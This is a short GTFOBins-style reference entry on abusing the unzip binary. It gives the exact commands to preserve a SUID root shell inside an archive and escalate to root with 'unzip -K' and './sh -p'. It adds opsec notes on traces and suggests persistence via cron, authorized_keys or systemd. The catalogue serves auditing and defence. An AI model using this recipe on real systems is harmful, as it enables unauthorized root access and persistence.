---
name: unzip
capabilities:
- exec
- suid
required_permissions:
  level: suid
  notes: Requires SUID bit set on the binary.
difficulty: low
opsec:
  noise: medium
  artifacts:
  - ~/.bash_history
  - Process arguments visible in ps and auditd
  notes: |-
    Certain `unzip` versions allows to preserve the SUID bit. For example, prepare an archive beforehand with the following commands as root:

    ```
    cp /bin/sh .
    chmod +s sh
    zip shell.zip sh
    ```
persistence_potential: true
examples:
- id: privilege-escalation
  description: Escalate to root via this binary.
  capabilities:
  - exec
  - suid
  command: |-
    unzip -K shell.zip
    ./sh -p
references:
- https://gtfobins.github.io/gtfobins/unzip/
tags: []
persistence_notes: Combine with write/exec primitives to drop cron entries, authorized_keys, or systemd units.
---
